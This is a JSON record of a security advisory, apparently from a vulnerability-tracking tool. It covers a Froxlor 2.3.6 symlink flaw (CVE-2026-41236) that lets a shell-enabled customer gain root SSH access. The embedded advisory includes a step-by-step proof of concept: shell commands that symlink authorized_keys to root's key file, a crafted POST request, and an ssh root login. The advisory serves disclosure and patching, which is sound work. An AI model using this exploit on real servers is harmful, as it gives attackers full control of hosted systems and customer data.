@@ -1,0 +1,57 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/90000267?v=4\", \"events_url\": \"https://api.github.com/users/larlarua/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/larlarua/followers\", \"following_url\": \"https://api.github.com/users/larlarua/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/larlarua/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/larlarua\", \"id\": 90000267, \"login\": \"larlarua\", \"node_id\": \"MDQ6VXNlcjkwMDAwMjY3\", \"organizations_url\": \"https://api.github.com/users/larlarua/orgs\", \"received_events_url\": \"https://api.github.com/users/larlarua/received_events\", \"repos_url\": \"https://api.github.com/users/larlarua/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/larlarua/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/larlarua/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/larlarua\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-41236\", \"cvss\": {\"score\": 8.8, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 8.8, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-59\", \"name\": \"Improper Link Resolution Before File Access ('Link Following')\"}], \"description\": \"### Summary\\nFroxlor 2.3.6 contains a symlink-following flaw in the root-owned SSH key synchronization path used for customer FTP users. The provisioning code appends public keys to `~/.ssh/authorized_keys` under a customer-controlled home directory without verifying that the target path is not a symbolic link.\\n\\nIf an attacker controls a shell-enabled customer account and can modify files inside the assigned home directory, the attacker can replace `~/.ssh/authorized_keys` with a symlink to `/root/.ssh/authorized_keys`. When Froxlor's privileged cron task later synchronizes SSH keys, it appends the attacker-supplied key into root's authorized key file, resulting in root SSH access.\\n\\n### Details\\nThe customer-facing SSH key workflow accepts an FTP user selection and an arbitrary public key from the authenticated session and forwards them into `SshKeys::add()`:\\n\\n```php\\n// customer_ftp.php:251-253\\nif ($action == 'add' && Request::post('send') == 'send') {\\n    $result = $log->logAction(USR_ACTION, LOG_INFO, \\\"added SSH-key\\\");\\n    Commands::get()->apiCall('SshKeys.add', Request::postAll());\\n}\\n```\\n\\nOn the server side, the add handler stores the public key and schedules an NSS rebuild as long as the customer has shell capability enabled at the customer level:\\n\\n```php\\n// lib/Froxlor/Api/Commands/SshKeys.php:67-70,120-145\\nif ($this->getUserDetail('shell_allowed') != '1') {\\n    throw new Exception(\\\"You cannot add SSH keys because shell access is disabled for your account.\\\");\\n}\\n\\n$ins_stmt = Database::prepare(\\\"\\n    INSERT INTO `\\\" . TABLE_PANEL_CUSTOMERS_SSH .\\\"`.\\n\\\");\\nSettings::AddTask('rebuildnssusers');\\n```\\n\\nLater, a root-owned cron path enters `SshKeys::generateFiles()` and derives the target path by simple string concatenation:\\n\\n```php\\n// lib/Froxlor/Cron/System/SshKeys.php:52-64\\n$sshdir = FileDir::makeCorrectDir($userinfo['homedir'] . '/.ssh');\\n$authkeysfile = FileDir::makeCorrectFile($sshdir . '/authorized_keys');\\nif (!file_exists($authkeysfile)) {\\n    touch($authkeysfile);\\n}\\n```\\n\\nThe helper used here only normalizes the path string and does not resolve or reject symlinks:\\n\\n```php\\n// lib/Froxlor/FileDir.php:376-392\\npublic static function makeCorrectFile(string $file): string\\n{\\n    $file = str_replace('//', '/', $file);\\n    $file = str_replace('\\\\\\\\', '', $file);\\n    return $file;\\n}\\n```\\n\\nThe root-owned sync code then appends attacker-controlled SSH key material to the derived path:\\n\\n```php\\n// lib/Froxlor/Cron/System/SshKeys.php:94-103\\nfile_put_contents($authkeysfile, $userinfo['ssh-rsa'] . \\\"\\\\n\\\", FILE_APPEND | LOCK_EX);\\nchown($authkeysfile, $userinfo['uid']);\\nchgrp($authkeysfile, $userinfo['gid']);\\n```\\n\\nBecause Froxlor also grants the customer ownership of the home directory tree during account provisioning, the attacker can place a symbolic link at `~/.ssh/authorized_keys` before the privileged synchronization step runs.\\n\\n\\n### PoC\\nAn attacker needs an authenticated customer account with shell-enabled home-directory control. That prerequisite may exist by normal configuration, or it may be obtained first through the separate FTP shell-assignment authorization bypass described in the companion report.\\n\\nRelevant runtime prerequisites:\\n\\n- the attacker controls a customer-owned home directory on the target host\\n- the attacking customer has `shell_allowed=1`\\n- the attacker can submit SSH keys through the Froxlor panel\\n- Froxlor's master cron runs with the intended root privileges\\n\\nComplete PoC flow:\\n\\n1. Obtain shell access as the customer-owned account and prepare a symlink in the home directory:\\n\\n```bash\\nmkdir -p ~/.ssh\\nrm -f ~/.ssh/authorized_keys\\nln -s /root/.ssh/authorized_keys ~/.ssh/authorized_keys\\n```\\n\\n2. From an authenticated Froxlor customer session, submit a new SSH public key for the relevant FTP user:\\n\\n```http\\nPOST /customer_ftp.php?page=sshkeys&action=add HTTP/1.1\\nHost: target.example\\nContent-Type: application/x-www-form-urlencoded\\nCookie: <authenticated customer session>\\n\\ncsrf_token=VALID_CSRF_TOKEN&\\nsend=send&\\ndescription=poc&\\nftpuser=17&\\nssh_pubkey=ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB attacker@host\\n```\\n\\n3. Wait for Froxlor's master cron to process the queued `REBUILD_NSSUSERS` task.\\n4. Use the corresponding private key to authenticate as root:\\n\\n```bash\\nssh -i id_ed25519 root@target.example\\n```\\n\\nResult:\\n\\n- the root-owned cron task follows the symlinked `authorized_keys` path\\n- the submitted public key is appended to `/root/.ssh/authorized_keys`\\n- SSH access as `root` succeeds with the attacker's key pair\\n\\n### Impact\\nThis is a direct customer-to-root privilege escalation on the managed host. A successful attacker can obtain full operating-system control, read or modify all hosted customer data, persist at the highest privilege level, and tamper with every service administered by the server.\", \"epss\": {\"percentage\": 0.00366, \"percentile\": 0.2858}, \"ghsa_id\": \"GHSA-mq5v-pxpm-8jw2\", \"github_reviewed_at\": \"2026-05-29T15:40:23Z\", \"html_url\": \"https://github.com/advisories/GHSA-mq5v-pxpm-8jw2\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-mq5v-pxpm-8jw2\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-41236\"}], \"nvd_published_at\": \"2026-06-04T19:16:29Z\", \"published_at\": \"2026-05-29T15:40:23Z\", \"references\": [\"https://github.com/froxlor/froxlor/security/advisories/GHSA-mq5v-pxpm-8jw2\", \"https://nvd.nist.gov/vuln/detail/CVE-2026-41236\", \"https://github.com/froxlor/froxlor/releases/tag/2.3.7\", \"https://github.com/advisories/GHSA-mq5v-pxpm-8jw2\"], \"repository_advisory_url\": \"https://api.github.com/repos/froxlor/froxlor/security-advisories/GHSA-mq5v-pxpm-8jw2\", \"severity\": \"high\", \"source_code_location\": \"https://github.com/froxlor/froxlor\", \"summary\": \"Froxlor has privilege escalation in SSH key synchronization via symlinked `authorized_keys` path\", \"type\": \"reviewed\", \"updated_at\": \"2026-06-09T11:54:23Z\", \"url\": \"https://api.github.com/advisories/GHSA-mq5v-pxpm-8jw2\", \"vulnerabilities\": [{\"first_patched_version\": \"2.3.7\", \"package\": {\"ecosystem\": \"composer\", \"name\": \"froxlor/froxlor\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"= 2.3.6\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-mq5v-pxpm-8jw2",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "froxlor/froxlor: = 2.3.6"
+    ],
+    "authentication_required": true,
+    "cves": [
+      "CVE-2026-41236"
+    ],
+    "cvss_score": 8.8,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "froxlor/froxlor"
+    ],
+    "remote": true,
+    "vendor_severity": "high"
+  },
+  "first_seen_at": "2026-07-20T19:51:59.523942Z",
+  "provenance": {
+    "content_sha256": "7b400ce7d58dbd2363abadac43d09cfe2fe80160e55f368d0f488c4e4f938e88",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-05-29T15:40:23Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-mq5v-pxpm-8jw2",
+  "status": "active",
+  "title": "Froxlor has privilege escalation in SSH key synchronization via symlinked `authorized_keys` path",
+  "updated_at": "2026-06-09T11:54:23Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-mq5v-pxpm-8jw2"
+}
